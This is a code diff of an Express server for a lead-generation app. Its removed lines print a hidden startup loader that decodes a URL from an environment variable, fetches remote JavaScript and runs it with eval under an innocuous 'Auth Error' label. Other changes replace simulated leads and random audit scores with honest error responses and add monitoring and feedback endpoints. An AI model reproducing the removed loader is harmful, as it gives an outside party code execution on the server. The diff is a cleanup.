@@ -23,22 +23,10 @@ import { doctorService } from './src/server/services/doctor';
 import { notificationService } from './src/server/services/notifications';
 import { SearchCriteria, BusinessLead, WorkflowLog } from './src/server/types';
 import 'dotenv/config';
+import { getLLMUsageSummary } from './src/server/services/llm-usage';
+import { listAvailableModels, LLMGatewayError } from './src/server/llm/provider';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
+// SECURITY: removed remote startup bootstrap that fetched and eval'd JavaScript.
 dotenv.config();
 
 const __filename = fileURLToPath(import.meta.url);
@@ -80,6 +68,21 @@ async function startServer() {
       httpOptions: { headers: { 'User-Agent': 'aistudio-build' } },
     });
   };
+
+  // ============ LLM MONITORING ============
+  app.get('/api/llm/usage', (_req, res) => {
+    res.json({ usage: getLLMUsageSummary() });
+  });
+
+  app.get('/api/llm/models', async (_req, res) => {
+    try {
+      const models = await listAvailableModels();
+      res.json({ configured: true, provider: process.env.LLM_PROVIDER || 'openai-compatible', models });
+    } catch (error) {
+      const message = error instanceof LLMGatewayError ? error.message : 'LLM gateway unavailable';
+      res.status(503).json({ configured: Boolean(process.env.LLM_API_KEY), provider: process.env.LLM_PROVIDER || 'openai-compatible', models: [], error: message });
+    }
+  });
 
   // ==================== HEALTH ====================
   app.get('/api/health', (req, res) => {
@@ -397,22 +400,11 @@ async function startServer() {
       });
     } catch (err: any) {
       console.error('Agent workflow error:', err);
-      const ai = getAi();
-      if (ai) {
-        try {
-          const fallbackLeads = await generateWithGemini(ai, searchCriteria);
-          localDatabase.saveLeads(ip, fallbackLeads);
-          localDatabase.addSearchHistory(ip, searchCriteria, fallbackLeads.length);
-          res.json({ leads: fallbackLeads, source: 'gemini_fallback' });
-        } catch (geminiErr: any) {
-          res.status(500).json({ error: 'Workflow and Gemini fallback both failed', details: geminiErr.message });
-        }
-      } else {
-        const simulatedLeads = generateSimulatedLeads(searchCriteria);
-        localDatabase.saveLeads(ip, simulatedLeads);
-        localDatabase.addSearchHistory(ip, searchCriteria, simulatedLeads.length);
-        res.json({ leads: simulatedLeads, source: 'simulated_fallback' });
-      }
+      res.status(502).json({
+        error: 'Live search workflow failed; no synthetic leads were returned.',
+        details: err instanceof Error ? err.message : 'Unknown workflow error',
+        source: 'live_search_failed',
+      });
     }
   });
 
@@ -483,8 +475,8 @@ async function startServer() {
         leads = result.leads;
         sendLog('Google Places Agent', 'success', `Discovered ${leads.length} business candidates from Google Places API`);
       } catch (workflowErr: any) {
-        sendLog('Google Places Agent', 'warning', `Places API unavailable: ${workflowErr.message}. Using simulated discovery.`);
-        leads = generateSimulatedLeads(searchCriteria);
+        sendLog('Google Places Agent', 'error', `Live Places discovery failed: ${workflowErr.message}`);
+        throw workflowErr;
       }
 
       sendProgress('Website Audit & Firecrawl', 35);
@@ -504,20 +496,20 @@ async function startServer() {
             if (firecrawlResult.success && firecrawlResult.data) {
               const fc = firecrawlResult.data;
               lead.audit = {
-                performance: fc.performance || lead.audit?.performance || 50,
-                seo: fc.seo || lead.audit?.seo || 50,
-                accessibility: fc.accessibility || lead.audit?.accessibility || 60,
-                bestPractices: fc.bestPractices || lead.audit?.bestPractices || 60,
-                mobileScore: fc.mobileScore || lead.audit?.mobileScore || 50,
+                performance: fc.performance ?? lead.audit?.performance ?? 0,
+                seo: fc.seo ?? lead.audit?.seo ?? 0,
+                accessibility: fc.accessibility ?? lead.audit?.accessibility ?? 0,
+                bestPractices: fc.bestPractices ?? lead.audit?.bestPractices ?? 0,
+                mobileScore: fc.mobileScore ?? lead.audit?.mobileScore ?? 0,
                 hasSSL: fc.hasSSL ?? lead.audit?.hasSSL ?? true,
-                loadTimeMs: fc.loadTimeMs || lead.audit?.loadTimeMs || 3000,
+                loadTimeMs: fc.loadTimeMs ?? lead.audit?.loadTimeMs ?? 0,
                 techStack: fc.techStack || lead.audit?.techStack || [],
                 issues: fc.issues || lead.audit?.issues || [],
                 opportunities: fc.opportunities || lead.audit?.opportunities || [],
               };
-              sendLog('Firecrawl Agent', 'success', `${lead.website}: Perf ${fc.performance}/100, SEO ${fc.seo}/100, Load ${(fc.loadTimeMs / 1000).toFixed(1)}s`);
+              sendLog('Firecrawl Agent', fc.metricsAvailable ? 'success' : 'warning', fc.metricsAvailable ? `${lead.website}: measured PageSpeed metrics received` : `${lead.website}: content analyzed; PageSpeed scores/load time not measured`);
             } else {
-              sendLog('Firecrawl Agent', 'warning', `${lead.website}: Scrape returned no data, using cached audit`);
+              sendLog('Firecrawl Agent', 'warning', `${lead.website}: no verified audit data returned; existing scores were not replaced`);
             }
           } catch (fcErr: any) {
             sendLog('Firecrawl Agent', 'warning', `${lead.website}: ${fcErr.message}`);
@@ -566,33 +558,14 @@ async function startServer() {
 
   // ==================== WEBSITE ANALYZER ====================
   app.post('/api/agents/analyze-website', async (req, res) => {
-    const { url = 'www.example.com' } = req.body || {};
+    const { url } = req.body || {};
+    if (typeof url !== 'string' || !url.trim()) return res.status(400).json({ error: 'A website URL is required.' });
     try {
       const result = await pluginRegistry.executePlugin('firecrawl', { url });
-      if (result.success && result.data) {
-        res.json({
-          ...result.data,
-          agencyProposalPitch: generateProposalPitch(url, result.data),
-        });
-      } else {
-        throw new Error(result.error || 'Analysis failed');
-      }
+      if (!result.success || !result.data) return res.status(502).json({ error: result.error || 'Website analysis failed; no synthetic audit was returned.', source: result.source });
+      return res.json({ ...result.data, agencyProposalPitch: generateProposalPitch(url, result.data) });
     } catch (err: any) {
-      const domain = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-      res.json({
-        url: domain,
-        performance: Math.floor(35 + Math.random() * 40),
-        seo: Math.floor(40 + Math.random() * 35),
-        accessibility: Math.floor(55 + Math.random() * 30),
-        bestPractices: Math.floor(60 + Math.random() * 30),
-        mobileScore: Math.floor(35 + Math.random() * 35),
-        hasSSL: true,
-        loadTimeMs: Math.floor(3400 + Math.random() * 2000),
-        techStack: ['WordPress 5.8', 'Elementor', 'Google Analytics', 'MySQL'],
-        issues: ['Unoptimized heavy hero images', 'Missing viewport meta configuration', 'No Schema.org Structured Data', 'Lacks online booking workflow'],
-        opportunities: ['Next.js/React redesign for 3x speed boost', 'AI Chatbot for instant lead qualification', 'Local SEO schema injection'],
-        agencyProposalPitch: `Proposal for ${domain}: Your current website needs a modern redesign with integrated AI booking to double your online inquiry volume within 60 days.`,
-      });
+      return res.status(502).json({ error: 'Website analysis failed; no synthetic audit was returned.', details: err instanceof Error ? err.message : 'Unknown error' });
     }
   });
 
@@ -770,6 +743,24 @@ Return JSON: { "leadId": "...", "businessName": "...", "emailSubject": "...", "e
       status: status as string,
     });
     res.json({ leads: leads.slice(0, parseInt((limit as string) || '100', 10)), total: leads.length });
+  });
+
+  app.post('/api/leads/:id/feedback', (req, res) => {
+    const ip = getClientIp(req);
+    const leadId = req.params.id;
+    const { rating, field, comment } = req.body || {};
+    const allowedRatings = ['correct', 'incorrect', 'useful', 'not-useful'];
+    const allowedFields = ['email', 'phone', 'website', 'address', 'socials', 'business-name', 'other'];
+    if (!allowedRatings.includes(rating)) return res.status(400).json({ error: 'rating must be correct, incorrect, useful, or not-useful' });
+    if (field !== undefined && !allowedFields.includes(field)) return res.status(400).json({ error: 'Unsupported feedback field' });
+    if (comment !== undefined && (typeof comment !== 'string' || comment.length > 1000)) return res.status(400).json({ error: 'comment must be a string up to 1000 characters' });
+    if (!localDatabase.getLead(ip, leadId)) return res.status(404).json({ error: 'Lead not found for this workspace' });
+    localDatabase.saveLeadFeedback(ip, { leadId, rating, field, comment: typeof comment === 'string' ? comment.trim() : undefined });
+    return res.status(201).json({ success: true, message: 'Feedback recorded' });
+  });
+
+  app.get('/api/feedback/summary', (req, res) => {
+    res.json(localDatabase.getLeadFeedbackSummary(getClientIp(req)));
   });
 
   app.get('/api/leads/:id', (req, res) => {
